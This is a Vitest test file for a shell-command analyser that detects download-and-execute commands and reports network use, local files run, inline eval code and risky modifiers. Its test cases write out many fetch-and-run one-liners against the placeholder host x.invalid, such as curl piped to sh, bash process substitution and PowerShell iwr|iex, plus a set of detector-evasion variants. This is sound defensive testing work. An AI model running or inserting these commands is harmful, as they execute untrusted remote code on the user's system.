import { describe, expect, it } from "vitest";
import { analyzeShell } from "./shell.ts";

describe("analyzeShell: download-and-execute", () => {
  it.each([
    ["classic pipe", "curl -fsSL https://x.invalid/i.sh | sh"],
    ["wget to stdout", "wget -qO- https://x.invalid/i.sh | bash"],
    ["sudo in the sink", "curl https://x.invalid/i | sudo bash -s --"],
    ["absolute paths", "/usr/bin/curl https://x.invalid/i | /bin/sh"],
    ["tee in between", "curl https://x.invalid/i | tee /tmp/i.sh | sh"],
    ["env prefix", "FOO=1 curl https://x.invalid/i | sh"],
    ["command wrapper", "command curl https://x.invalid/i | command sh"],
    ["busybox", "busybox wget -O- https://x.invalid/i | busybox sh"],
    ["piped into node", "curl https://x.invalid/i.js | node"],
    ["piped into python", "curl https://x.invalid/i.py | python3 -"],
    ["process substitution", "bash <(curl -s https://x.invalid/i.sh)"],
    [
      "command substitution in sh -c",
      'sh -c "$(curl -fsSL https://x.invalid/i.sh)"',
    ],
    ["backticks in sh -c", "sh -c `curl https://x.invalid/i.sh`"],
    ["eval of a download", 'eval "$(wget -qO- https://x.invalid/i)"'],
    ["source a download", "source <(curl https://x.invalid/i)"],
    ["dot a download", ". <(curl https://x.invalid/i)"],
    ["nested sh -c script", `sh -c 'curl https://x.invalid/i | sh'`],
    [
      "download, chmod, run",
      "curl -o /tmp/x https://x.invalid/x && chmod +x /tmp/x && /tmp/x",
    ],
    ["download then sh file", "wget -O i.sh https://x.invalid/i.sh; sh i.sh"],
    ["redirect then run", "curl https://x.invalid/i > i.sh && bash i.sh"],
    [
      "wget default filename",
      "wget https://x.invalid/payload.sh && sh payload.sh",
    ],
    ["curl -O remote name", "curl -O https://x.invalid/run && ./run"],
    ["after a known tool", "prisma generate && curl https://x.invalid/i | sh"],
    ["powershell", "iwr https://x.invalid/i.ps1 | iex"],
  ])("detects %s", (_name, command) => {
    expect(analyzeShell(command).downloadExecute).toBe(true);
  });

  it.each([
    ["download only", "curl -fsSL https://x.invalid/data.json -o data.json"],
    ["unrelated pipe", "cat README.md | grep install"],
    ["quoted pipe is not a pipe", `echo "curl x | sh"`],
    [
      "shell after download, other file",
      "curl -o a.json https://x.invalid/a.json && sh scripts/setup.sh",
    ],
    ["sink before download", "sh -c true | curl https://x.invalid/ping"],
  ])("does not flag %s", (_name, command) => {
    expect(analyzeShell(command).downloadExecute).toBe(false);
  });
});

describe("analyzeShell: facts", () => {
  it("reports network use without execution", () => {
    expect(analyzeShell("curl -s https://x.invalid/ping")).toMatchObject({
      network: true,
      downloadExecute: false,
    });
    expect(analyzeShell("node scripts/setup.js").network).toBe(false);
  });

  it("collects local files the command executes", () => {
    expect(
      analyzeShell("node scripts/setup.js && sh ./tools/x.sh; ./bin/run --fast")
        .localFiles,
    ).toEqual(["scripts/setup.js", "tools/x.sh", "bin/run"]);
    expect(analyzeShell("npx tsx scripts/gen.ts").localFiles).toEqual([
      "scripts/gen.ts",
    ]);
    expect(analyzeShell("node --require ./hook.js app.js").localFiles).toEqual([
      "hook.js",
      "app.js",
    ]);
  });

  it("extracts inline code for node -e / --eval / -p", () => {
    expect(analyzeShell(`node -e "console.log(1)"`).inlineCode).toEqual([
      "console.log(1)",
    ]);
    expect(analyzeShell(`node --eval='eval(atob("eA=="))'`).inlineCode).toEqual(
      ['eval(atob("eA=="))'],
    );
  });

  it("lists command names, with wrappers stripped", () => {
    expect(
      analyzeShell("sudo FOO=1 prisma generate && npx husky").commands,
    ).toEqual(["prisma", "husky"]);
  });

  it("marks unbalanced quotes as unparsable instead of guessing", () => {
    expect(analyzeShell(`echo "oops`).unparsable).toBe(true);
  });

  it("refuses absurdly long or deeply nested input instead of hanging", () => {
    expect(analyzeShell(`echo ${"x".repeat(50_000)}`).unparsable).toBe(true);
    expect(
      analyzeShell(`echo ${"$(".repeat(20)}true${")".repeat(20)}`).unparsable,
    ).toBe(true);
  });

  it("names package.json scripts run through a package manager", () => {
    expect(
      analyzeShell("npm run build && pnpm lint && yarn run test --watch")
        .runScripts,
    ).toEqual(["build", "lint", "test"]);
    expect(
      analyzeShell("npm test && npm start && bun run gen").runScripts,
    ).toEqual(["test", "start", "gen"]);
    expect(
      analyzeShell("npm install && pnpm add x && yarn dlx y && npm ci")
        .runScripts,
    ).toEqual([]);
  });

  it("reports modifiers that change what a command does", () => {
    expect(
      analyzeShell("NODE_OPTIONS='--require ./x.js' tsc").modifiers,
    ).toEqual(["sets NODE_OPTIONS"]);
    expect(analyzeShell("echo x >> ~/.zshenv").modifiers).toEqual([
      "redirects input or output",
    ]);
    expect(analyzeShell("sudo tsc").modifiers).toEqual(["runs through sudo"]);
    expect(analyzeShell("npx --yes --package=evil tsc").modifiers).toEqual([
      "runs through npx --yes --package=evil",
    ]);
    expect(analyzeShell("pnpm -r run build").modifiers).toEqual([
      "runs scripts across workspaces",
    ]);
    expect(analyzeShell("npx husky && tsc -p .").modifiers).toEqual([]);
  });

  it.each([
    ["brace group", "{ curl -s https://x.invalid/i; } | sh"],
    ["if/then", "if true; then curl -s https://x.invalid/i | sh; fi"],
    ["negation", "! curl -s https://x.invalid/i | sh"],
    ["for loop", "for u in https://x.invalid/a; do curl $u | sh; done"],
    ["timeout wrapper", "timeout 60 curl -s https://x.invalid/i | sh"],
    ["xargs", "echo https://x.invalid/i | xargs curl | sh"],
    ["combined -ec flag", "sh -ec 'curl -s https://x.invalid/i | sh'"],
    ["curl -sSLo cluster", "curl -sSLo a.sh https://x.invalid/a.sh && sh a.sh"],
    ["wget -qO cluster", "wget -qO a.sh https://x.invalid/a.sh && sh a.sh"],
    [
      "tee into a process substitution",
      "curl -s https://x.invalid/i | tee >(sh)",
    ],
    [
      "a trailing comment with a quote",
      "curl -s https://x.invalid/i | sh # it's fine",
    ],
  ])("closes evasion: %s", (_name, command) => {
    expect(analyzeShell(command)).toMatchObject({
      downloadExecute: true,
      unparsable: false,
    });
  });

  it("reports a downloader mentioned in input it cannot parse", () => {
    expect(analyzeShell(`curl -s https://x.invalid/i | sh "`)).toMatchObject({
      unparsable: true,
      mentionsDownloader: true,
    });
    expect(analyzeShell(`echo "oops`)).toMatchObject({
      unparsable: true,
      mentionsDownloader: false,
    });
    expect(analyzeShell(`curl x | sh ${"x".repeat(20_000)}`)).toMatchObject({
      unparsable: true,
      mentionsDownloader: true,
    });
  });
});
